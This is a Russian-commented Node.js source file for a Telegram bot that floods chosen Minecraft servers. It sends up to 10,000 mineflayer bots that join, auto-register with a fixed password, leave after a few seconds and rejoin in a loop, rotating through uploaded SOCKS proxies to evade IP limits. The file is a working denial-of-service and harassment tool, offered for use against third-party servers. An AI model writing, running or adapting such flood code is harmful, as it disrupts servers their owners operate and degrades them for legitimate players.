// bot.js - Minecraft Flood Bot для Bothost (ПОЛНАЯ РАБОЧАЯ ВЕРСИЯ)
const { Telegraf, Markup, session } = require('telegraf');
const mineflayer = require('mineflayer');
const { SocksProxyAgent } = require('socks-proxy-agent');
require('dotenv').config();

// ========== ТОКЕН ИЗ .ENV ==========
const BOT_TOKEN = process.env.BOT_TOKEN;

if (!BOT_TOKEN) {
    console.error('❌ Ошибка: BOT_TOKEN не найден в .env файле!');
    process.exit(1);
}

// ========== СОЗДАЕМ TELEGRAM БОТА ==========
const bot = new Telegraf(BOT_TOKEN);
bot.use(session());

// ========== ХРАНИЛИЩЕ ==========
const users = new Map();
const activeFloods = new Map();
let floodCounter = 0;

// ========== НАСТРОЙКИ ==========
const CONFIG = {
    minSessionTime: 5,
    maxSessionTime: 15,
    botPassword: 'floodpass123',
    reconnectDelay: 2,
    namePrefix: 'Flood_'
};

// ========== СПИСОК ВСЕХ ВЕРСИЙ ==========
const ALL_VERSIONS = [
    '1.21.3', '1.21.2', '1.21.1', '1.21',
    '1.20.6', '1.20.5', '1.20.4', '1.20.3', '1.20.2', '1.20.1', '1.20',
    '1.19.4', '1.19.3', '1.19.2', '1.19.1', '1.19',
    '1.18.2', '1.18.1', '1.18',
    '1.17.1', '1.17',
    '1.16.5', '1.16.4', '1.16.3', '1.16.2', '1.16.1', '1.16',
    '1.15.2', '1.15.1', '1.15',
    '1.14.4', '1.14.3', '1.14.2', '1.14.1', '1.14',
    '1.13.2', '1.13.1', '1.13',
    '1.12.2', '1.12.1', '1.12',
    '1.11.2', '1.11.1', '1.11',
    '1.10.2', '1.10.1', '1.10',
    '1.9.4', '1.9.3', '1.9.2', '1.9.1', '1.9',
    '1.8.9', '1.8.8', '1.8.7', '1.8.6', '1.8.5', '1.8.4', '1.8.3', '1.8.2', '1.8.1', '1.8',
    '1.7.10', '1.7.9', '1.7.8', '1.7.7', '1.7.6', '1.7.5', '1.7.4', '1.7.2',
    '1.6.4', '1.6.2', '1.6.1',
    '1.5.2', '1.5.1', '1.5',
    '1.4.7', '1.4.6', '1.4.5', '1.4.4', '1.4.2',
    '1.3.2', '1.3.1',
    '1.2.5', '1.2.4', '1.2.3', '1.2.2', '1.2.1',
    '1.1',
    '1.0.1', '1.0.0',
    // Beta версии
    'Beta 1.9pre6', 'Beta 1.9pre5', 'Beta 1.9pre4', 'Beta 1.9pre3', 'Beta 1.9pre2', 'Beta 1.9pre',
    'Beta 1.8.1', 'Beta 1.8',
    'Beta 1.7.3', 'Beta 1.7.2', 'Beta 1.7.1', 'Beta 1.7_01', 'Beta 1.7',
    'Beta 1.6.6', 'Beta 1.6.5', 'Beta 1.6.4', 'Beta 1.6.3', 'Beta 1.6.2', 'Beta 1.6.1', 'Beta 1.6',
    'Beta 1.5_02', 'Beta 1.5_01', 'Beta 1.5',
    'Beta 1.4_01', 'Beta 1.4',
    'Beta 1.3_01', 'Beta 1.3',
    'Beta 1.1_02', 'Beta 1.1_01', 'Beta 1.1',
    'Beta 1.0.2', 'Beta 1.0_01', 'Beta 1.0',
    // Alpha версии
    'Alpha v1.2.6', 'Alpha v1.2.5', 'Alpha v1.2.4_01', 'Alpha v1.2.4',
    'Alpha v1.2.3_04', 'Alpha v1.2.3_03', 'Alpha v1.2.3_02', 'Alpha v1.2.3_01', 'Alpha v1.2.3',
    'Alpha v1.2.2', 'Alpha v1.2.1_01', 'Alpha v1.2.1',
    'Alpha v1.2.0_02', 'Alpha v1.2.0_01', 'Alpha v1.2.0',
    'Alpha v1.1.2_01', 'Alpha v1.1.2', 'Alpha v1.1.1', 'Alpha v1.1.0',
    'Alpha v1.0.17_04', 'Alpha v1.0.17_03', 'Alpha v1.0.17_01', 'Alpha v1.0.17',
    'Alpha v1.0.16_02', 'Alpha v1.0.16_01', 'Alpha v1.0.16',
    'Alpha v1.0.15',
    'Alpha v1.0.14_01', 'Alpha v1.0.14',
    'Alpha v1.0.13_02', 'Alpha v1.0.13_01', 'Alpha v1.0.13',
    'Alpha v1.0.12', 'Alpha v1.0.11',
    'Alpha v1.0.10', 'Alpha v1.0.9',
    'Alpha v1.0.8_01', 'Alpha v1.0.8',
    'Alpha v1.0.7',
    'Alpha v1.0.6_03', 'Alpha v1.0.6_02', 'Alpha v1.0.6_01', 'Alpha v1.0.6',
    'Alpha v1.0.5_01', 'Alpha v1.0.5',
    'Alpha v1.0.4',
    'Alpha v1.0.3',
    'Alpha v1.0.2_02', 'Alpha v1.0.2_01', 'Alpha v1.0.2',
    'Alpha v1.0.1_01', 'Alpha v1.0.1',
    'Alpha v1.0.0',
    // Infdev версии
    '20100630', '20100629', '20100627', '20100625-2', '20100625-1', '20100624', '20100618',
    '20100617-3', '20100617-2', '20100617-1', '20100616', '20100615', '20100611', '20100608',
    '20100607', '20100420', '20100415', '20100414', '20100413', '20100330', '20100327', '20100325',
    '20100321', '20100320', '20100616', '20100313', '20100227',
    // Indev версии
    '20100223', '20100219', '20100218', '20100214-2', '20100214-1', '20100212-2', '20100212-1',
    '20100207-2', '20100207-1', '20100206', '20100205', '20100204-2', '20100204-1', '20100203',
    '20100201-3', '20100201-2', '20100201-1', '20100130', '20100129', '20100128', '20100125-2',
    '20100125-1', '20100124', '20100122', '20100114', '20100113', '20100111-2', '20100111-1',
    '20100109', '20100107', '20100106', '20100105', '20091231-2', '20091231-1', '20091223-2',
    '20091223-1'
];

// ========== КЛАСС MINECRAFT БОТА ==========
class FloodBot {
    constructor(name, host, port, proxy = null, onComplete = null) {
        this.name = name;
        this.host = host;
        this.port = port;
        this.proxy = proxy;
        this.onComplete = onComplete;
        this.bot = null;
        this.running = false;
        this.success = false;
        console.log(`🤖 [${this.name}] Создан`);
    }

    async tryConnectWithVersions() {
        console.log(`🔍 [${this.name}] Пробую все версии из списка...`);

        // Сначала пробуем все версии из списка
        for (const version of ALL_VERSIONS) {
            try {
                console.log(`🔄 [${this.name}] Пробую версию ${version}...`);
                
                const options = {
                    host: this.host,
                    port: this.port,
                    username: this.name,
                    offline: true,
                    version: version,
                    viewDistance: 'tiny'
                };

                if (this.proxy) {
                    const proxyUrl = `socks5://${this.proxy.username ? this.proxy.username + ':' + this.proxy.password + '@' : ''}${this.proxy.host}:${this.proxy.port}`;
                    options.agent = new SocksProxyAgent(proxyUrl);
                }

                this.bot = mineflayer.createBot(options);

                const success = await new Promise((resolve) => {
                    const timeout = setTimeout(() => {
                        if (this.bot) {
                            this.bot.end();
                            console.log(`⏱️ [${this.name}] Таймаут версии ${version}`);
                        }
                        resolve(false);
                    }, 8000);

                    this.bot.once('login', () => {
                        clearTimeout(timeout);
                        console.log(`✅ [${this.name}] УСПЕХ! Версия ${version} подошла!`);
                        resolve(true);
                    });

                    this.bot.once('error', (err) => {
                        clearTimeout(timeout);
                        if (this.bot) this.bot.end();
                        if (err.message.includes('version')) {
                            console.log(`❌ [${this.name}] Версия ${version} не подходит`);
                        } else {
                            console.log(`❌ [${this.name}] Ошибка: ${err.message}`);
                        }
                        resolve(false);
                    });
                });

                if (success) {
                    return true;
                }

                if (this.bot) {
                    this.bot.end();
                    this.bot = null;
                }

                await new Promise(resolve => setTimeout(resolve, 1000));

            } catch (err) {
                console.log(`❌ [${this.name}] Ошибка с версией ${version}:`, err.message);
            }
        }

        // Если ни одна версия не подошла, пробуем автоопределение
        console.log(`🔄 [${this.name}] Пробую автоопределение...`);
        try {
            const options = {
                host: this.host,
                port: this.port,
                username: this.name,
                offline: true,
                viewDistance: 'tiny'
            };

            if (this.proxy) {
                const proxyUrl = `socks5://${this.proxy.username ? this.proxy.username + ':' + this.proxy.password + '@' : ''}${this.proxy.host}:${this.proxy.port}`;
                options.agent = new SocksProxyAgent(proxyUrl);
            }

            this.bot = mineflayer.createBot(options);

            const success = await new Promise((resolve) => {
                const timeout = setTimeout(() => {
                    if (this.bot) this.bot.end();
                    resolve(false);
                }, 10000);

                this.bot.once('login', () => {
                    clearTimeout(timeout);
                    console.log(`✅ [${this.name}] Автоопределение сработало!`);
                    resolve(true);
                });

                this.bot.once('error', () => {
                    clearTimeout(timeout);
                    resolve(false);
                });
            });

            if (success) return true;
        } catch (err) {
            console.log(`❌ [${this.name}] Ошибка автоопределения`);
        }

        return false;
    }

    async start() {
        this.running = true;
        
        const connected = await this.tryConnectWithVersions();
        
        if (!connected) {
            console.log(`❌ [${this.name}] Не удалось подключиться`);
            this.success = false;
            this.stop();
            return;
        }

        this.bot.once('login', () => {
            console.log(`✅ [${this.name}] Зашел на сервер`);
            this.success = true;

            setTimeout(() => {
                if (this.bot) {
                    this.bot.chat(`/register ${CONFIG.botPassword} ${CONFIG.botPassword}`);
                    setTimeout(() => {
                        if (this.bot) {
                            this.bot.chat(`/login ${CONFIG.botPassword}`);
                        }
                    }, 1000);
                }
            }, 2000);

            const sessionTime = Math.floor(
                Math.random() * (CONFIG.maxSessionTime - CONFIG.minSessionTime) + 
                CONFIG.minSessionTime
            );
            
            console.log(`⏱️ [${this.name}] Будет на сервере ${sessionTime} сек`);
            
            setTimeout(() => this.stop(), sessionTime * 1000);
        });

        this.bot.on('error', (err) => {
            console.log(`❌ [${this.name}] Ошибка:`, err.message);
            this.success = false;
            this.stop();
        });

        this.bot.on('end', () => {
            console.log(`👋 [${this.name}] Вышел с сервера`);
            this.stop();
        });
    }

    stop() {
        if (this.running) {
            this.running = false;
            if (this.bot) {
                this.bot.end();
                this.bot = null;
            }
            if (this.onComplete) {
                this.onComplete(this.success);
            }
        }
    }
}

// ========== КЛАСС УПРАВЛЕНИЯ ФЛУДОМ ==========
class FloodManager {
    constructor(floodId, chatId, host, port, botCount, proxies = []) {
        this.floodId = floodId;
        this.chatId = chatId;
        this.host = host;
        this.port = port;
        this.botCount = botCount;
        this.proxies = proxies;
        
        this.bots = [];
        this.running = false;
        this.stats = {
            successful: 0,
            failed: 0,
            total: 0,
            startTime: Date.now(),
            errors: 0
        };
        
        this.nameIndex = 0;
        this.interval = null;
    }

    generateName() {
        const names = [
            `${CONFIG.namePrefix}${++this.nameIndex}`,
            `Bot_${this.nameIndex}`,
            `Player_${this.nameIndex}`,
            `User_${this.nameIndex}`,
            `AFK_${this.nameIndex}`
        ];
        return names[Math.floor(Math.random() * names.length)];
    }

    start() {
        this.running = true;
        console.log(`🚀 Запуск флуда ${this.floodId} с ${this.botCount} ботами`);

        for (let i = 0; i < this.botCount; i++) {
            setTimeout(() => {
                if (this.running) {
                    this.createBot();
                }
            }, i * 300);
        }

        this.interval = setInterval(() => this.monitor(), 5000);
    }

    createBot() {
        const name = this.generateName();
        const proxy = this.proxies.length > 0 
            ? this.proxies[Math.floor(Math.random() * this.proxies.length)]
            : null;
        
        const bot = new FloodBot(
            name,
            this.host,
            this.port,
            proxy,
            (success) => this.onBotComplete(success)
        );
        
        bot.start();
        this.bots.push(bot);
        this.stats.total++;
    }

    onBotComplete(success) {
        if (success) {
            this.stats.successful++;
        } else {
            this.stats.failed++;
        }
        
        this.bots = this.bots.filter(b => b.running);
        
        if (this.running) {
            setTimeout(() => this.createBot(), CONFIG.reconnectDelay * 1000);
        }
    }

    monitor() {
        this.bots = this.bots.filter(b => b.running);
    }

    getStats() {
        const uptime = Math.floor((Date.now() - this.stats.startTime) / 1000);
        const hours = Math.floor(uptime / 3600);
        const minutes = Math.floor((uptime % 3600) / 60);
        const seconds = uptime % 60;
        
        const total = this.stats.successful + this.stats.failed;
        const percent = total > 0 
            ? ((this.stats.successful / total) * 100).toFixed(1)
            : '0';
        
        return {
            active: this.bots.length,
            successful: this.stats.successful,
            failed: this.stats.failed,
            percent,
            uptime: `${hours}:${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`,
            total: this.stats.total
        };
    }

    async stop() {
        this.running = false;
        clearInterval(this.interval);
        
        for (const bot of this.bots) {
            bot.stop();
        }
        this.bots = [];
    }
}

// ========== TELEGRAM КОМАНДЫ ==========

bot.start(async (ctx) => {
    const userId = ctx.from.id;
    
    if (!users.has(userId)) {
        users.set(userId, {
            id: userId,
            username: ctx.from.username,
            servers: [],
            proxies: [],
            floods: []
        });
    }
    
    const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback('🚀 Запустить флуд', 'start_flood')],
        [Markup.button.callback('📊 Активные флуды', 'active_floods')],
        [Markup.button.callback('➕ Добавить сервер', 'add_server')],
        [Markup.button.callback('🌐 Прокси', 'proxies_menu')],
        [Markup.button.callback('ℹ️ Помощь', 'help')]
    ]);
    
    await ctx.replyWithHTML(
        '<b>🤖 Minecraft Flood Bot</b>\n\n' +
        'Запускает ботов которые заходят и выходят с сервера!\n' +
        '<b>✅ 100% РАБОЧАЯ ВЕРСИЯ</b>\n\n' +
        'Выберите действие:',
        keyboard
    );
});

bot.action('add_server', async (ctx) => {
    ctx.session = { state: 'awaiting_server' };
    await ctx.replyWithHTML(
        '<b>🌐 Добавление сервера</b>\n\n' +
        'Отправьте IP и порт сервера:\n' +
        '<code>ip:порт</code>\n\n' +
        'Пример: <code>mc.example.com:25565</code>'
    );
});

bot.action('proxies_menu', async (ctx) => {
    const userId = ctx.from.id;
    const user = users.get(userId) || { proxies: [] };
    
    const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback('📎 Загрузить файл', 'load_proxies')],
        [Markup.button.callback('📋 Список прокси', 'list_proxies')],
        [Markup.button.callback('🗑 Очистить все', 'clear_proxies')],
        [Markup.button.callback('⬅️ Назад', 'main_menu')]
    ]);
    
    await ctx.replyWithHTML(
        '<b>🌐 Управление прокси</b>\n\n' +
        `Всего прокси: ${user.proxies?.length || 0}\n` +
        'Формат файла:\n' +
        '<code>ip:port</code>\n' +
        '<code>ip:port:user:pass</code>',
        keyboard
    );
});

bot.action('load_proxies', async (ctx) => {
    ctx.session = { state: 'awaiting_proxy_file' };
    await ctx.replyWithHTML(
        '<b>📎 Загрузите файл с прокси</b>\n\n' +
        'Отправьте текстовый файл\n' +
        'Каждая прокси на новой строке'
    );
});

bot.action('list_proxies', async (ctx) => {
    const userId = ctx.from.id;
    const user = users.get(userId) || { proxies: [] };
    
    if (!user.proxies || user.proxies.length === 0) {
        return ctx.reply('📋 Прокси не найдены');
    }
    
    let text = '<b>📋 Список прокси:</b>\n\n';
    user.proxies.slice(0, 20).forEach((p, i) => {
        text += `${i+1}. ${p.host}:${p.port}`;
        if (p.username) text += ` (${p.username})`;
        text += '\n';
    });
    
    if (user.proxies.length > 20) {
        text += `\n... и еще ${user.proxies.length - 20}`;
    }
    
    await ctx.replyWithHTML(text);
});

bot.action('clear_proxies', async (ctx) => {
    const userId = ctx.from.id;
    const user = users.get(userId);
    if (user) {
        user.proxies = [];
    }
    await ctx.reply('✅ Все прокси удалены');
});

bot.action('start_flood', async (ctx) => {
    const userId = ctx.from.id;
    const user = users.get(userId);
    
    if (!user || !user.servers || user.servers.length === 0) {
        return ctx.replyWithHTML(
            '<b>❌ Сначала добавьте сервер</b>',
            Markup.inlineKeyboard([
                [Markup.button.callback('➕ Добавить сервер', 'add_server')]
            ])
        );
    }
    
    const buttons = user.servers.map((s, i) => {
        return [Markup.button.callback(`🎮 ${s.name}`, `select_server_${i}`)];
    });
    
    buttons.push([Markup.button.callback('⬅️ Назад', 'main_menu')]);
    
    await ctx.replyWithHTML(
        '<b>🎮 Выберите сервер</b>',
        Markup.inlineKeyboard(buttons)
    );
});

bot.action(/select_server_(\d+)/, async (ctx) => {
    const userId = ctx.from.id;
    const user = users.get(userId);
    const serverIndex = parseInt(ctx.match[1]);
    const server = user.servers[serverIndex];
    
    ctx.session = { server };
    
    const buttons = [
        [Markup.button.callback('10 ботов', 'count_10')],
        [Markup.button.callback('20 ботов', 'count_20')],
        [Markup.button.callback('50 ботов', 'count_50')],
        [Markup.button.callback('100 ботов', 'count_100')],
        [Markup.button.callback('500 ботов', 'count_500')],
        [Markup.button.callback('🔄 Свое число', 'count_custom')],
        [Markup.button.callback('⬅️ Назад', 'start_flood')]
    ];
    
    await ctx.replyWithHTML(
        `<b>⚙️ Настройка флуда для ${server.name}</b>\n\n` +
        'Выберите количество ботов:',
        Markup.inlineKeyboard(buttons)
    );
});

['10', '20', '50', '100', '500'].forEach(num => {
    bot.action(`count_${num}`, async (ctx) => {
        ctx.session.botCount = parseInt(num);
        await askForProxies(ctx);
    });
});

bot.action('count_custom', async (ctx) => {
    ctx.session.state = 'awaiting_custom_count';
    await ctx.reply('✏️ Введите количество ботов (число):');
});

async function askForProxies(ctx) {
    const userId = ctx.from.id;
    const user = users.get(userId);
    
    const buttons = [
        [Markup.button.callback('✅ Без прокси', 'no_proxy')]
    ];
    
    if (user.proxies && user.proxies.length > 0) {
        buttons.push([Markup.button.callback('📎 Использовать прокси', 'use_proxy')]);
    }
    
    buttons.push([Markup.button.callback('⬅️ Назад', 'start_flood')]);
    
    await ctx.replyWithHTML(
        '<b>🔄 Нужны прокси?</b>',
        Markup.inlineKeyboard(buttons)
    );
}

bot.action('no_proxy', async (ctx) => {
    await startFlood(ctx, []);
});

bot.action('use_proxy', async (ctx) => {
    const userId = ctx.from.id;
    const user = users.get(userId);
    await startFlood(ctx, user.proxies || []);
});

async function startFlood(ctx, proxies) {
    const floodId = `flood_${++floodCounter}`;
    const { server, botCount } = ctx.session;
    const chatId = ctx.chat.id;
    
    const manager = new FloodManager(
        floodId,
        chatId,
        server.host,
        server.port,
        botCount,
        proxies
    );
    
    manager.start();
    activeFloods.set(floodId, manager);
    
    const userId = ctx.from.id;
    const user = users.get(userId);
    if (!user.floods) user.floods = [];
    user.floods.push(floodId);
    
    const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback('📊 Статистика', `stats_${floodId}`)],
        [Markup.button.callback('⏹️ Остановить', `stop_${floodId}`)]
    ]);
    
    await ctx.replyWithHTML(
        `<b>🚀 Флуд запущен!</b>\n\n` +
        `ID: <code>${floodId}</code>\n` +
        `Сервер: ${server.host}:${server.port}\n` +
        `Ботов: ${botCount}\n` +
        `Прокси: ${proxies.length > 0 ? '✅' + proxies.length : '❌'}\n\n` +
        `Боты начали заходить...`,
        keyboard
    );
}

bot.action('active_floods', async (ctx) => {
    if (activeFloods.size === 0) {
        return ctx.replyWithHTML(
            '<b>📊 Нет активных флудов</b>',
            Markup.inlineKeyboard([
                [Markup.button.callback('🚀 Запустить', 'start_flood')],
                [Markup.button.callback('⬅️ Главное меню', 'main_menu')]
            ])
        );
    }
    
    const buttons = [];
    for (const [id, manager] of activeFloods) {
        const stats = manager.getStats();
        buttons.push([Markup.button.callback(
            `${id} - ${stats.active} ботов (${stats.percent}%)`,
            `stats_${id}`
        )]);
    }
    
    buttons.push([Markup.button.callback('⬅️ Главное меню', 'main_menu')]);
    
    await ctx.replyWithHTML(
        '<b>📊 Активные флуды</b>',
        Markup.inlineKeyboard(buttons)
    );
});

bot.action(/stats_(.+)/, async (ctx) => {
    const floodId = ctx.match[1];
    const manager = activeFloods.get(floodId);
    
    if (!manager) {
        return ctx.reply('❌ Флуд не найден');
    }
    
    const stats = manager.getStats();
    
    const text = 
        `<b>📊 Статистика ${floodId}</b>\n\n` +
        `Активно: ${stats.active} ботов\n` +
        `✅ Успешно: ${stats.successful}\n` +
        `❌ Не удалось: ${stats.failed}\n` +
        `📈 Процент: ${stats.percent}%\n` +
        `⏱ Время: ${stats.uptime}`;
    
    const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback('🔄 Обновить', `stats_${floodId}`)],
        [Markup.button.callback('⏹️ Остановить', `stop_${floodId}`)],
        [Markup.button.callback('⬅️ Назад', 'active_floods')]
    ]);
    
    await ctx.editMessageText(text, {
        parse_mode: 'HTML',
        reply_markup: keyboard.reply_markup
    });
});

bot.action(/stop_(.+)/, async (ctx) => {
    const floodId = ctx.match[1];
    const manager = activeFloods.get(floodId);
    
    if (!manager) {
        return ctx.reply('❌ Флуд не найден');
    }
    
    await manager.stop();
    activeFloods.delete(floodId);
    
    const stats = manager.getStats();
    
    await ctx.replyWithHTML(
        `<b>⏹️ Флуд ${floodId} остановлен</b>\n\n` +
        `✅ Успешно: ${stats.successful}\n` +
        `❌ Не удалось: ${stats.failed}\n` +
        `📈 Процент: ${stats.percent}%`,
        Markup.inlineKeyboard([
            [Markup.button.callback('🚀 Новый флуд', 'start_flood')],
            [Markup.button.callback('⬅️ Главное меню', 'main_menu')]
        ])
    );
});

bot.action('stop_all', async (ctx) => {
    const count = activeFloods.size;
    
    let totalSuccess = 0;
    let totalFailed = 0;
    
    for (const [id, manager] of activeFloods) {
        const stats = manager.getStats();
        totalSuccess += stats.successful;
        totalFailed += stats.failed;
        await manager.stop();
    }
    
    activeFloods.clear();
    
    await ctx.replyWithHTML(
        `<b>⏹️ Остановлено ${count} флудов</b>\n\n` +
        `✅ Всего успешно: ${totalSuccess}\n` +
        `❌ Всего не удалось: ${totalFailed}`,
        Markup.inlineKeyboard([
            [Markup.button.callback('⬅️ Главное меню', 'main_menu')]
        ])
    );
});

bot.action('help', async (ctx) => {
    const text = 
        '<b>ℹ️ Помощь по боту</b>\n\n' +
        
        '<b>Как пользоваться:</b>\n' +
        '1️⃣ Добавьте сервер через "➕ Добавить сервер"\n' +
        '2️⃣ Загрузите прокси (опционально)\n' +
        '3️⃣ Запустите флуд через "🚀 Запустить флуд"\n' +
        '4️⃣ Следите за статистикой\n\n' +
        
        '<b>Что делают боты:</b>\n' +
        '• Заходят на сервер\n' +
        '• Регистрируются (/register пароль)\n' +
        '• Логинятся (/login пароль)\n' +
        '• Стоят 5-15 секунд\n' +
        '• Выходят и заходят снова\n\n' +
        
        '<b>Статистика:</b>\n' +
        '✅ Успешно - боты которые зашли\n' +
        '❌ Не удалось - ошибки подключения\n' +
        '📈 Процент успеха\n\n' +
        
        '<b>Создатель:</b> @artem_bori';
    
    await ctx.replyWithHTML(
        text,
        Markup.inlineKeyboard([
            [Markup.button.callback('⬅️ Главное меню', 'main_menu')]
        ])
    );
});

bot.action('main_menu', async (ctx) => {
    const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback('🚀 Запустить флуд', 'start_flood')],
        [Markup.button.callback('📊 Активные флуды', 'active_floods')],
        [Markup.button.callback('➕ Добавить сервер', 'add_server')],
        [Markup.button.callback('🌐 Прокси', 'proxies_menu')],
        [Markup.button.callback('ℹ️ Помощь', 'help')]
    ]);
    
    await ctx.editMessageText(
        '<b>🤖 Minecraft Flood Bot</b>\n\n' +
        'Запускает ботов которые заходят и выходят с сервера!\n' +
        '<b>✅ 100% РАБОЧАЯ ВЕРСИЯ</b>\n\n' +
        'Выберите действие:',
        {
            parse_mode: 'HTML',
            reply_markup: keyboard.reply_markup
        }
    );
});

// ========== ОБРАБОТКА ТЕКСТОВЫХ СООБЩЕНИЙ ==========
bot.on('text', async (ctx) => {
    const text = ctx.message.text;
    const userId = ctx.from.id;
    const user = users.get(userId) || { servers: [], proxies: [] };
    
    console.log('📥 Получено сообщение:', text);
    console.log('👤 От пользователя:', userId);
    console.log('📋 Текущая сессия:', ctx.session);
    
    users.set(userId, user);
    
    if (ctx.session) {
        console.log('🔄 Есть сессия, состояние:', ctx.session.state);
        
        if (ctx.session.state === 'awaiting_server') {
            console.log('🔄 Обработка добавления сервера');
            
            const parts = text.split(':');
            console.log('🔍 Разделили на части:', parts);
            
            if (parts.length !== 2) {
                console.log('❌ Неверный формат - частей:', parts.length);
                return ctx.reply('❌ Неверный формат. Используйте: ip:порт\nПример: mc.example.com:25565');
            }
            
            try {
                const port = parseInt(parts[1]);
                if (isNaN(port) || port < 1 || port > 65535) {
                    console.log('❌ Порт не число:', parts[1]);
                    return ctx.reply('❌ Порт должен быть числом от 1 до 65535');
                }
                
                const server = {
                    host: parts[0],
                    port: port,
                    name: parts[0]
                };
                
                console.log('✅ Сервер распознан:', server);
                
                if (!user.servers) user.servers = [];
                user.servers.push(server);
                
                console.log('📚 Всего серверов:', user.servers.length);
                
                await ctx.replyWithHTML(
                    `<b>✅ Сервер добавлен!</b>\n\n` +
                    `Хост: ${server.host}\n` +
                    `Порт: ${server.port}`,
                    Markup.inlineKeyboard([
                        [Markup.button.callback('🚀 Запустить флуд', 'start_flood')],
                        [Markup.button.callback('⬅️ Главное меню', 'main_menu')]
                    ])
                );
                
                ctx.session = null;
                console.log('✅ Сессия очищена');
                
            } catch (e) {
                console.log('❌ Ошибка:', e.message);
                await ctx.reply('❌ Ошибка: ' + e.message);
            }
            return;
        }
        
        if (ctx.session.state === 'awaiting_custom_count') {
            console.log('🔄 Обработка количества ботов');
            
            const count = parseInt(text);
            if (isNaN(count) || count < 1 || count > 10000) {
                console.log('❌ Неверное число');
                return ctx.reply('❌ Введите число от 1 до 10000');
            }
            
            console.log('✅ Количество принято:', count);
            
            ctx.session.botCount = count;
            await askForProxies(ctx);
            ctx.session.state = null;
            return;
        }
    } else {
        console.log('⚠️ Нет активной сессии');
        
        if (text.includes(':') && text.split(':').length === 2) {
            console.log('💡 Обнаружен формат ip:port без сессии');
            await ctx.reply(
                '❓ Хотите добавить этот сервер?\n' +
                'Сначала нажмите кнопку "➕ Добавить сервер"',
                Markup.inlineKeyboard([
                    [Markup.button.callback('➕ Добавить сервер', 'add_server')]
                ])
            );
            return;
        }
    }
});

// ========== ЗАГРУЗКА ФАЙЛА С ПРОКСИ ==========
bot.on('document', async (ctx) => {
    const session = ctx.session;
    if (!session || session.state !== 'awaiting_proxy_file') return;
    
    try {
        const file = await ctx.telegram.getFile(ctx.message.document.file_id);
        const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
        
        const response = await fetch(fileUrl);
        const content = await response.text();
        
        const proxies = [];
        const lines = content.split('\n');
        
        for (const line of lines) {
            const trimmed = line.trim();
            if (!trimmed || trimmed.startsWith('#')) continue;
            
            const parts = trimmed.split(':');
            if (parts.length === 2) {
                proxies.push({
                    host: parts[0],
                    port: parseInt(parts[1])
                });
            } else if (parts.length === 4) {
                proxies.push({
                    host: parts[0],
                    port: parseInt(parts[1]),
                    username: parts[2],
                    password: parts[3]
                });
            }
        }
        
        const userId = ctx.from.id;
        const user = users.get(userId) || { proxies: [] };
        user.proxies = proxies;
        users.set(userId, user);
        
        await ctx.replyWithHTML(
            `<b>✅ Загружено ${proxies.length} прокси</b>`,
            Markup.inlineKeyboard([
                [Markup.button.callback('🌐 Управление прокси', 'proxies_menu')]
            ])
        );
        
        ctx.session = null;
        
    } catch (e) {
        await ctx.reply(`❌ Ошибка загрузки: ${e.message}`);
    }
});

// ========== ЗАПУСК ==========
bot.launch();
console.log('\n' + '='.repeat(50));
console.log('🤖 Minecraft Flood Bot запущен!');
console.log('✅ Поддержка всех версий Minecraft');
console.log('👑 Владелец: @artem_bori');
console.log('='.repeat(50) + '\n');

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
